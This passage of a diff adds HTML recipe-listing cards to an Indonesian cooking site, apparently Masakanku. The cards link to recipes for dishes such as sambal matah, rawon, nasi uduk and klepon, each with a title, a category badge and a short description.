+                  <h5 class="card-title"><a href="/resep-sambal-matah">Resep Sambal Matah Asli Bali: Pedas Segar, Aroma Jeruk Limau Bikin Nagih! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Sambal khas Bali, segar dengan bawang merah, serai, cabai, dan minyak kelapa.</p>
+                  <a href="/resep-sambal-matah" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Sambal" data-search="resep sambal terasi pedas: wangi, mantap, bikin makan jadi lebih lahap! - masakanku sambal terasi pedas wangi, perpaduan cabai dan terasi bakar yang mantap.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1549037173-e3b7184319e6?w=600&q=80" alt="Resep Sambal Terasi Pedas: Wangi, Mantap, Bikin Makan Jadi Lebih Lahap! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Sambal</span>
+                  <h5 class="card-title"><a href="/resep-sambal-terasi">Resep Sambal Terasi Pedas: Wangi, Mantap, Bikin Makan Jadi Lebih Lahap! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Sambal terasi pedas wangi, perpaduan cabai dan terasi bakar yang mantap.</p>
+                  <a href="/resep-sambal-terasi" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ikan" data-search="3 rahasia pepes ikan mas dijamin super gurih — resep lengkap pernah gagal bikin pepes ikan mas? ikuti 3 trik rahasia ini. bumbu meresap sempurna, daun pisang gak robek. resep step-by-step + tips koki. coba sekarang!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1519708227418-c8fd9a32b7a2?w=600&q=80" alt="3 Rahasia Pepes Ikan Mas Dijamin Super Gurih — Resep Lengkap" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ikan</span>
+                  <h5 class="card-title"><a href="/resep-pepes-ikan-mas">3 Rahasia Pepes Ikan Mas Dijamin Super Gurih — Resep Lengkap</a></h5>
+                  <p class="card-text small flex-grow-1">Pernah gagal bikin pepes ikan mas? Ikuti 3 trik rahasia ini. Bumbu meresap sempurna, daun pisang gak robek. Resep ste...</p>
+                  <a href="/resep-pepes-ikan-mas" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep perkedel kentang super gurih & legit — anti gagal! — masakanku resep perkedel kentang anti gagal: tips kentang bubur tanpa telur, cara bikin bulat rapi, dan hasil renyah di luar, empuk di dalem. dijamin berhasil!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Perkedel Kentang Super Gurih & Legit — Anti Gagal! — MasakanKu" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/resep-perkedel-kentang">Resep Perkedel Kentang Super Gurih & Legit — Anti Gagal! — MasakanKu</a></h5>
+                  <p class="card-text small flex-grow-1">Resep perkedel kentang anti gagal: tips kentang bubur tanpa telur, cara bikin bulat rapi, dan hasil renyah di luar, e...</p>
+                  <a href="/resep-perkedel-kentang" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ikan" data-search="resep pindang patin khas palembang — kuah asam pedas segar mau bikin pindang patin ala palembang di rumah? ikuti resep lengkapnya! kuah asam pedas segar, ikan patin empuk, bumbu rempah autentik. dijamin ketagihan!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1519708227418-c8fd9a32b7a2?w=600&q=80" alt="Resep Pindang Patin Khas Palembang — Kuah Asam Pedas Segar" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ikan</span>
+                  <h5 class="card-title"><a href="/resep-pindang-patin">Resep Pindang Patin Khas Palembang — Kuah Asam Pedas Segar</a></h5>
+                  <p class="card-text small flex-grow-1">Mau bikin Pindang Patin ala Palembang di rumah? Ikuti resep lengkapnya! Kuah asam pedas segar, ikan patin empuk, bumb...</p>
+                  <a href="/resep-pindang-patin" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Nasi" data-search="resep pisang goreng kriuk renyah resep pisang goreng crispy yang renyah di luar, lembut di dalam. pakai 3 bahan rahasia biar nggak lecek. enak buat cemilan sore.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1512058564366-18510be2db19?w=600&q=80" alt="Resep Pisang Goreng Kriuk Renyah" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Nasi</span>
+                  <h5 class="card-title"><a href="/resep-pisang-goreng">Resep Pisang Goreng Kriuk Renyah</a></h5>
+                  <p class="card-text small flex-grow-1">Resep pisang goreng crispy yang renyah di luar, lembut di dalam. Pakai 3 bahan rahasia biar nggak lecek. Enak buat ce...</p>
+                  <a href="/resep-pisang-goreng" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Sapi" data-search="resep rawon asli jawa timur: 5 rahasia kuah hitam yang bikin nagih resep rawon asli jawa timur dengan kuah hitam pekat dan daging super empuk. lengkap dengan 5 rahasia bumbu, tips daging lumer, dan trik kuah gurih sepanjang hari.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1558030089-654c1e967069?w=600&q=80" alt="Resep Rawon Asli Jawa Timur: 5 Rahasia Kuah Hitam yang Bikin Nagih" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Sapi</span>
+                  <h5 class="card-title"><a href="/resep-rawon">Resep Rawon Asli Jawa Timur: 5 Rahasia Kuah Hitam yang Bikin Nagih</a></h5>
+                  <p class="card-text small flex-grow-1">Resep rawon asli Jawa Timur dengan kuah hitam pekat dan daging super empuk. Lengkap dengan 5 rahasia bumbu, tips dagi...</p>
+                  <a href="/resep-rawon" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Sayur" data-search="resep orek tempe kering: 5 cara biar awet sampai seminggu orek tempe kering yang tahan lama tanpa pengawet. ada 5 cara memasak biar renyah dan awet sampai seminggu. lauk praktis buat bekal.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1540420773420-3366772f4999?w=600&q=80" alt="Resep Orek Tempe Kering: 5 Cara Biar Awet Sampai Seminggu" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Sayur</span>
+                  <h5 class="card-title"><a href="/resep-orek-tempe-kering">Resep Orek Tempe Kering: 5 Cara Biar Awet Sampai Seminggu</a></h5>
+                  <p class="card-text small flex-grow-1">Orek tempe kering yang tahan lama tanpa pengawet. Ada 5 cara memasak biar renyah dan awet sampai seminggu. Lauk prakt...</p>
+                  <a href="/resep-orek-tempe-kering" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Sayur" data-search="5 trik oseng tempe kacang panjang yang gurih &amp; nggak cepet basi - masakanku resep oseng tempe kacang panjang gurih dan nggak cepet basi. 5 trik jitu bikin oseng tempe seenak masakan rumahan. cocok buat sahur dan bekal!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1540420773420-3366772f4999?w=600&q=80" alt="5 Trik Oseng Tempe Kacang Panjang yang Gurih &amp; Nggak Cepet Basi - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Sayur</span>
+                  <h5 class="card-title"><a href="/resep-oseng-tempe-kacang-panjang">5 Trik Oseng Tempe Kacang Panjang yang Gurih &amp; Nggak Cepet Basi - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Resep oseng tempe kacang panjang gurih dan nggak cepet basi. 5 trik jitu bikin oseng tempe seenak masakan rumahan. Co...</p>
+                  <a href="/resep-oseng-tempe-kacang-panjang" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ikan" data-search="resep otak-otak ikan tenggiri — camilan gurih &amp; nikmat resep otak-otak ikan tenggiri khas bumbu kacang yang gurih dan lembut. simak cara membuat otak-otak panggang daun pisang ala rumahan.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1519708227418-c8fd9a32b7a2?w=600&q=80" alt="Resep Otak-Otak Ikan Tenggiri — Camilan Gurih &amp; Nikmat" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ikan</span>
+                  <h5 class="card-title"><a href="/resep-otak-otak-ikan">Resep Otak-Otak Ikan Tenggiri — Camilan Gurih &amp; Nikmat</a></h5>
+                  <p class="card-text small flex-grow-1">Resep otak-otak ikan tenggiri khas bumbu kacang yang gurih dan lembut. Simak cara membuat otak-otak panggang daun pis...</p>
+                  <a href="/resep-otak-otak-ikan" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Minuman" data-search="resep pecel lele crispy sambal super pedas ala tepi jalan resep pecel lele crispy dengan sambal super pedas khas pinggir jalan. rahasia lele garing renyah, nggak amis, sambal bikin nagih. anti gagal!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1544145945-f90425340c7e?w=600&q=80" alt="Resep Pecel Lele Crispy Sambal Super Pedas Ala Tepi Jalan" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Minuman</span>
+                  <h5 class="card-title"><a href="/resep-pecel-lele">Resep Pecel Lele Crispy Sambal Super Pedas Ala Tepi Jalan</a></h5>
+                  <p class="card-text small flex-grow-1">Resep pecel lele crispy dengan sambal super pedas khas pinggir jalan. Rahasia lele garing renyah, nggak amis, sambal ...</p>
+                  <a href="/resep-pecel-lele" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Nasi" data-search="resep nasi goreng kampung spesial: rasa tradisional yang bikin kangen! - masakanku nasi goreng kampung dengan terasi dan kencur, bumbu diulek manual.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1512058564366-18510be2db19?w=600&q=80" alt="Resep Nasi Goreng Kampung Spesial: Rasa Tradisional yang Bikin Kangen! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Nasi</span>
+                  <h5 class="card-title"><a href="/resep-nasi-goreng-kampung">Resep Nasi Goreng Kampung Spesial: Rasa Tradisional yang Bikin Kangen! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Nasi goreng kampung dengan terasi dan kencur, bumbu diulek manual.</p>
+                  <a href="/resep-nasi-goreng-kampung" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ikan" data-search="resep nasi goreng seafood spesial resep nasi goreng seafood yang gurih dan kaya rasa. pakai udang, cumi, dan bakso ikan. bikin sendiri di rumah, lebih enak dari restoran!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1519708227418-c8fd9a32b7a2?w=600&q=80" alt="Resep Nasi Goreng Seafood Spesial" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ikan</span>
+                  <h5 class="card-title"><a href="/resep-nasi-goreng-seafood">Resep Nasi Goreng Seafood Spesial</a></h5>
+                  <p class="card-text small flex-grow-1">Resep nasi goreng seafood yang gurih dan kaya rasa. Pakai udang, cumi, dan bakso ikan. Bikin sendiri di rumah, lebih ...</p>
+                  <a href="/resep-nasi-goreng-seafood" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Nasi" data-search="resep nasi kuning pulen & wangi seperti di hajatan — anti gagal! resep nasi kuning super pulen dan wangi ala hajatan. lengkap dengan bumbu rahasia, tips anti lembek, dan cara bikin kuningnya merata. dijamin nagih!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1512058564366-18510be2db19?w=600&q=80" alt="Resep Nasi Kuning Pulen & Wangi Seperti di Hajatan — Anti Gagal!" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Nasi</span>
+                  <h5 class="card-title"><a href="/resep-nasi-kuning">Resep Nasi Kuning Pulen & Wangi Seperti di Hajatan — Anti Gagal!</a></h5>
+                  <p class="card-text small flex-grow-1">Resep nasi kuning super pulen dan wangi ala hajatan. Lengkap dengan bumbu rahasia, tips anti lembek, dan cara bikin k...</p>
+                  <a href="/resep-nasi-kuning" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Nasi" data-search="resep nasi liwet khas solo: gurih wangi santan, cocok buat makan bareng keluarga - masakanku nasi liwet solo gurih wangi santan, serai, daun salam, cocok untuk kumpul keluarga.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1512058564366-18510be2db19?w=600&q=80" alt="Resep Nasi Liwet Khas Solo: Gurih Wangi Santan, Cocok buat Makan Bareng Keluarga - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Nasi</span>
+                  <h5 class="card-title"><a href="/resep-nasi-liwet-solo">Resep Nasi Liwet Khas Solo: Gurih Wangi Santan, Cocok buat Makan Bareng Keluarga - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Nasi liwet Solo gurih wangi santan, serai, daun salam, cocok untuk kumpul keluarga.</p>
+                  <a href="/resep-nasi-liwet-solo" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Nasi" data-search="resep nasi uduk betawi: wangi, gurih, sarapan favorit sejuta umat! - masakanku resep nasi uduk khas betawi yang wangi dan gurih. pakai santan, serai, dan daun pandan. cocok buat sarapan dengan lauk kesukaan.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1512058564366-18510be2db19?w=600&q=80" alt="Resep Nasi Uduk Betawi: Wangi, Gurih, Sarapan Favorit Sejuta Umat! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Nasi</span>
+                  <h5 class="card-title"><a href="/resep-nasi-uduk">Resep Nasi Uduk Betawi: Wangi, Gurih, Sarapan Favorit Sejuta Umat! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Resep nasi uduk khas Betawi yang wangi dan gurih. Pakai santan, serai, dan daun pandan. Cocok buat sarapan dengan lau...</p>
+                  <a href="/resep-nasi-uduk" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep opor ayam kampung: gurih santan, empuk lumer, wajib coba! - masakanku resep opor ayam kampung kuah santan gurih khas lebaran. daging empuk, bumbu meresap, cocok disandingkan dengan ketupat atau lontong.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Opor Ayam Kampung: Gurih Santan, Empuk Lumer, Wajib Coba! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/resep-opor-ayam">Resep Opor Ayam Kampung: Gurih Santan, Empuk Lumer, Wajib Coba! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Resep opor ayam kampung kuah santan gurih khas Lebaran. Daging empuk, bumbu meresap, cocok disandingkan dengan ketupa...</p>
+                  <a href="/resep-opor-ayam" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep martabak telur super renyah & berserat — 7 bahan rahasia anti gagal! resep martabak telur kulit tipis renyah, isi melimpah, berserat cantik. rahasia adonan tepung dan 7 bahan rahasia biar anti gagal dan bikin nagih!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Martabak Telur Super Renyah & Berserat — 7 Bahan Rahasia Anti Gagal!" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/resep-martabak-telur">Resep Martabak Telur Super Renyah & Berserat — 7 Bahan Rahasia Anti Gagal!</a></h5>
+                  <p class="card-text small flex-grow-1">Resep martabak telur kulit tipis renyah, isi melimpah, berserat cantik. Rahasia adonan tepung dan 7 bahan rahasia bia...</p>
+                  <a href="/resep-martabak-telur" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Resep" data-search="resep masakan sederhana cepat dan mudah untuk pemula - masakanku resep praktis buat yang baru belajar masak.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1466637574441-749b8f19452f?w=600&q=80" alt="Resep Masakan Sederhana Cepat dan Mudah untuk Pemula - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Resep</span>
+                  <h5 class="card-title"><a href="/resep-masakan-sederhana-cepat-dan-mudah">Resep Masakan Sederhana Cepat dan Mudah untuk Pemula - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Resep praktis buat yang baru belajar masak.</p>
+                  <a href="/resep-masakan-sederhana-cepat-dan-mudah" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep mie ayam klasik enak resep mie ayam rumahan yang rasanya juara. topping ayam gurih, kuah kaldu bening, dan pangsit renyah. dijamin seenak abang-abang!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Mie Ayam Klasik Enak" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/resep-mie-ayam">Resep Mie Ayam Klasik Enak</a></h5>
+                  <p class="card-text small flex-grow-1">Resep mie ayam rumahan yang rasanya juara. Topping ayam gurih, kuah kaldu bening, dan pangsit renyah. Dijamin seenak ...</p>
+                  <a href="/resep-mie-ayam" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Kue" data-search="resep nagasari pisang: kue tradisional lembut, wangi pandan, bikin kangen masa kecil - masakanku nagasari pisang lembut, kue tradisional bungkus daun pisang, wangi dan legit.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1551024601-bec78aea704b?w=600&q=80" alt="Resep Nagasari Pisang: Kue Tradisional Lembut, Wangi Pandan, Bikin Kangen Masa Kecil - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Kue</span>
+                  <h5 class="card-title"><a href="/resep-nagasari-pisang">Resep Nagasari Pisang: Kue Tradisional Lembut, Wangi Pandan, Bikin Kangen Masa Kecil - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Nagasari pisang lembut, kue tradisional bungkus daun pisang, wangi dan legit.</p>
+                  <a href="/resep-nagasari-pisang" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep kari ayam nikmat: kuah kental rempah, daging empuk lumer! - masakanku resep kari ayam dengan kuah santan kental dan rempah-rempah pilihan. daging empuk, aroma menggoda, cocok jadi menu spesial keluarga.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Kari Ayam Nikmat: Kuah Kental Rempah, Daging Empuk Lumer! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/resep-kari-ayam">Resep Kari Ayam Nikmat: Kuah Kental Rempah, Daging Empuk Lumer! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Resep kari ayam dengan kuah santan kental dan rempah-rempah pilihan. Daging empuk, aroma menggoda, cocok jadi menu sp...</p>
+                  <a href="/resep-kari-ayam" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Kue" data-search="resep klepon kenyal manis: jajanan pasar tradisional yang lumer di mulut! - masakanku klepon anti gagal, isian gula merah lumer, balutan kelapa parut gurih.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1551024601-bec78aea704b?w=600&q=80" alt="Resep Klepon Kenyal Manis: Jajanan Pasar Tradisional yang Lumer di Mulut! - Masakanku" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Kue</span>
+                  <h5 class="card-title"><a href="/resep-klepon-kenyal-manis">Resep Klepon Kenyal Manis: Jajanan Pasar Tradisional yang Lumer di Mulut! - Masakanku</a></h5>
+                  <p class="card-text small flex-grow-1">Klepon anti gagal, isian gula merah lumer, balutan kelapa parut gurih.</p>
+                  <a href="/resep-klepon-kenyal-manis" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Kue" data-search="resep kue lumpur kentang lembut resep kue lumpur kentang yang lembut, manis, dan lumer di mulut. lengkap dengan tips biar nggak bantat. jajanan pasar favorit sepanjang masa!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1551024601-bec78aea704b?w=600&q=80" alt="Resep Kue Lumpur Kentang Lembut" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Kue</span>
+                  <h5 class="card-title"><a href="/resep-kue-lumpur">Resep Kue Lumpur Kentang Lembut</a></h5>
+                  <p class="card-text small flex-grow-1">Resep kue lumpur kentang yang lembut, manis, dan lumer di mulut. Lengkap dengan tips biar nggak bantat. Jajanan pasar...</p>
+                  <a href="/resep-kue-lumpur" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Nasi" data-search="resep kwetiau goreng spesial resep kwetiau goreng chinese-indonesian yang gurih, wangi, dan nggak lengket. pakai teknik rahasia yang bikin rasanya seperti punya restoran!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1512058564366-18510be2db19?w=600&q=80" alt="Resep Kwetiau Goreng Spesial" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Nasi</span>
+                  <h5 class="card-title"><a href="/resep-kwetiau-goreng">Resep Kwetiau Goreng Spesial</a></h5>
+                  <p class="card-text small flex-grow-1">Resep kwetiau goreng Chinese-Indonesian yang gurih, wangi, dan nggak lengket. Pakai teknik rahasia yang bikin rasanya...</p>
+                  <a href="/resep-kwetiau-goreng" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Sayur" data-search="resep karedok — sayuran segar khas sunda yang bikin nagih resep karedok sayuran mentah segar khas sunda dengan bumbu kacang pedas gurih. cara mudah bikin karedok di rumah dalam 15 menit. cocok untuk diet sehat!">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1540420773420-3366772f4999?w=600&q=80" alt="Resep Karedok — Sayuran Segar Khas Sunda yang Bikin Nagih" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Sayur</span>
+                  <h5 class="card-title"><a href="/resep-karedok">Resep Karedok — Sayuran Segar Khas Sunda yang Bikin Nagih</a></h5>
+                  <p class="card-text small flex-grow-1">Resep karedok sayuran mentah segar khas Sunda dengan bumbu kacang pedas gurih. Cara mudah bikin karedok di rumah dala...</p>
+                  <a href="/resep-karedok" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ikan" data-search="resep ikan gurame asam manis — 3 rahasia bikin renyah crispy anti gagal dulu cuma bisa makan di restoran. sekarang bikin sendiri di rumah! resep ikan gurame asam manis crispy, saus asam manis nagih, dan 3 tips anti gagal.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1519708227418-c8fd9a32b7a2?w=600&q=80" alt="Resep Ikan Gurame Asam Manis — 3 Rahasia Bikin Renyah Crispy Anti Gagal" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ikan</span>
+                  <h5 class="card-title"><a href="/resep-ikan-gurame-asam-manis-populer">Resep Ikan Gurame Asam Manis — 3 Rahasia Bikin Renyah Crispy Anti Gagal</a></h5>
+                  <p class="card-text small flex-grow-1">Dulu cuma bisa makan di restoran. Sekarang bikin sendiri di rumah! Resep ikan gurame asam manis crispy, saus asam man...</p>
+                  <a href="/resep-ikan-gurame-asam-manis-populer" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ikan" data-search="resep ikan kembung goreng: 4 rahasia biar garing dan tidak amis ikan kembung goreng yang garing di luar, empuk di dalam, dan tidak amis. 4 rahasia simple yang bikin hasilnya beda dari biasanya.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1519708227418-c8fd9a32b7a2?w=600&q=80" alt="Resep Ikan Kembung Goreng: 4 Rahasia Biar Garing dan Tidak Amis" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ikan</span>
+                  <h5 class="card-title"><a href="/resep-ikan-kembung-goreng">Resep Ikan Kembung Goreng: 4 Rahasia Biar Garing dan Tidak Amis</a></h5>
+                  <p class="card-text small flex-grow-1">Ikan kembung goreng yang garing di luar, empuk di dalam, dan tidak amis. 4 rahasia simple yang bikin hasilnya beda da...</p>
